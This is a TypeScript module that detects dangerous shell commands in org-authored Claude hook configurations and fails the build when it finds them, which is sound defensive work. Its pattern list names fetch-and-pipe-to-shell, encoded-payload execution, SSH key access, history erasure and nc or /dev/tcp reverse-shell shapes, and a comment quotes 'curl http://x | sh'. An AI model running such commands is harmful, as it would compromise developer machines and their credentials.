/**
 * I2 / D.1 — dangerous org-authored hook commands.
 *
 * WHY THIS FILE EXISTS (and why it is not inside validate.ts)
 * ----------------------------------------------------------
 * A `claude.hooks` command is not ordinary config. It is a shell command the hub
 * compiles into a managed-settings file that then executes on every developer
 * machine in the org, at every prompt or tool call, NON-OVERRIDABLY. It is the
 * single highest-privilege value in an AgentBoot config.
 *
 * The check for it originally lived only in `scripts/validate.ts` — and neither
 * `build` nor `sync` calls validate. There is no `runValidation` import anywhere
 * in `compile.ts` or `sync.ts`. So the gate sat off the path it protects:
 *
 *     build → exit 0, command written to dist/claude/core/managed-settings.d/00-org.json
 *     sync  → exit 0, "✓ Synced 1 of 1 repo — 32 files written"
 *     spoke   .claude/managed-settings.d/00-org.json: "curl http://x | sh"
 *
 * (Verified end to end on a scaffolded hub + spoke on 2026-08-08.) `validate`
 * flagged it correctly and exited 1 — but only if the operator happened to run
 * it. A check the pipeline never reaches is not a check.
 *
 * So the patterns live here, and BOTH surfaces consume them: `validate` reports
 * them as a check, and `compile` fails the build. One list, two callers — two
 * copies of a security pattern list is how the two would drift apart.
 *
 * This is NOT a sandbox. A determined author obfuscates past any pattern list;
 * this is aimed at the accidental and the copy-pasted, which is what nearly all
 * of these will be. That framing is why false positives matter: a check that
 * fires on hooks orgs genuinely write gets switched off, and then it protects
 * nothing.
 */

export interface DangerousHookFinding {
  event: string;
  command: string;
  /** Why the pattern is dangerous. Never report "dangerous" without this. */
  why: string;
}

export const DANGEROUS_HOOK_PATTERNS: Array<{ re: RegExp; why: string }> = [
  { re: /\brm\s+(-[a-zA-Z]*\s+)*-[a-zA-Z]*[rR][a-zA-Z]*f|\brm\s+-[a-zA-Z]*f[a-zA-Z]*[rR]/,
    why: "recursive force-delete" },
  { re: /\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba)?sh\b/,
    why: "pipes a network download straight into a shell" },
  { re: /\bbase64\b[^|]*\|\s*(ba)?sh\b/,
    why: "decodes and executes an encoded payload" },
  { re: /\beval\b/, why: "eval executes constructed strings" },
  { re: /\bsudo\b/, why: "escalates privilege on a developer machine" },
  { re: /\bchmod\s+(-[a-zA-Z]+\s+)*777\b/, why: "world-writable permissions" },
  { re: /(^|[^A-Za-z0-9_])>\s*\/dev\/(sd|nvme|disk)/, why: "writes to a raw block device" },
  { re: /\.ssh\/(id_[a-z0-9]+|authorized_keys)/, why: "touches SSH private keys or authorized_keys" },
  { re: /\bhistory\s+-c\b|\bunset\s+HISTFILE\b|HISTFILE=\/dev\/null/,
    why: "erases shell history — anti-forensic" },
  { re: /\bnc\b\s+(-[a-zA-Z]+\s+)*[^\s]+\s+\d+|\/dev\/tcp\//,
    why: "opens a raw network connection (reverse-shell shape)" },
  { re: /\bgit\s+push\b[^\n]*--force|\bgit\s+push\b[^\n]*\s-f(\s|$)/,
    why: "force-push from a hook rewrites history unattended" },
];

/** Every shell command string reachable from a `claude.hooks` config block. */
export function collectHookCommands(hooks: unknown): Array<{ event: string; command: string }> {
  const out: Array<{ event: string; command: string }> = [];
  if (!hooks || typeof hooks !== "object" || Array.isArray(hooks)) return out;
  for (const [event, entries] of Object.entries(hooks as Record<string, unknown>)) {
    if (!Array.isArray(entries)) continue;
    for (const entry of entries) {
      if (!entry || typeof entry !== "object") continue;
      const inner = (entry as { hooks?: unknown }).hooks;
      if (!Array.isArray(inner)) continue;
      for (const h of inner) {
        if (h && typeof h === "object" && typeof (h as { command?: unknown }).command === "string") {
          out.push({ event, command: (h as { command: string }).command });
        }
      }
    }
  }
  return out;
}

/**
 * Every dangerous pattern matched by every org-authored hook command.
 *
 * Returns one finding PER PATTERN, not per command: a command that both pipes a
 * download into a shell and erases history has two problems, and reporting one
 * would let the author fix that one and re-ship.
 */
export function dangerousHookFindings(hooks: unknown): DangerousHookFinding[] {
  const findings: DangerousHookFinding[] = [];
  for (const { event, command } of collectHookCommands(hooks)) {
    for (const { re, why } of DANGEROUS_HOOK_PATTERNS) {
      if (re.test(command)) findings.push({ event, command, why });
    }
  }
  return findings;
}
